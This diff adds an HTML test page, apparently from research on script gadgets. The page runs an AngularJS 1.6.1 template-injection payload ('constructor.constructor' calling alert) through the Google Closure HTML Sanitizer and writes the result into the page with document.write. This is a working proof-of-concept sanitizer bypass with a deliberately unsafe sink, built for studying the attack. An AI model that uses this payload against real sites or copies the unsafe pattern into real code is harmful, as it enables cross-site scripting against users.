@@ -1,0 +1,42 @@
+<head>
+    <script src="{{ url_for('static', filename='angular-1.6.1/angular.min.js') }}"></script>
+    <script src="{{ url_for('static', filename='closure-library-20170409/closure/goog/base.js') }}"></script>
+    <script src="data:,goog.require('goog.html.sanitizer.HtmlSanitizer');goog.require('goog.html.SafeHtml');"></script>
+    <script src="{{ url_for('static', filename='tools/axios.min.js') }}"></script>
+    <script>
+      function getParam(name) {
+        var param = location.search.slice(1).split("&")[0].split("=");
+        if (param[0] == name) {
+          return unescape(param[1]);
+        } else {
+          return undefined;
+        }
+      }
+    </script>
+  </head>
+  
+  <body ng-app>
+    <div>Try to attack Google Closure HTML Sanitizer v20170409 with gadgets in AngularJS 1.6.1</div>
+    <button onclick="attack()">Attack</button> 
+    <script>
+      var sanitizer = new goog.html.sanitizer.HtmlSanitizer.Builder().build();
+      document.write(goog.html.SafeHtml.unwrap(sanitizer.sanitize(getParam("inj"))));
+    </script>
+      <!-- Get attack code -->
+      <script>
+        // let url = window.location.protocol + '//' + window.location.host;
+        let url = window.location.href
+        const attack = () => {
+          axios.post(url, {
+            payload: "{% raw %}<div ng-app>{{''.constructor.constructor('alert(1)')()}}</div>{% endraw %}"
+          })
+          .then(function (response) {
+            console.log(response);
+            window.location.replace(url+"?inj="+response.data);
+          })
+          .catch(function (error) {
+            console.log(error);
+          });
+        }
+      </script>
+  </body>
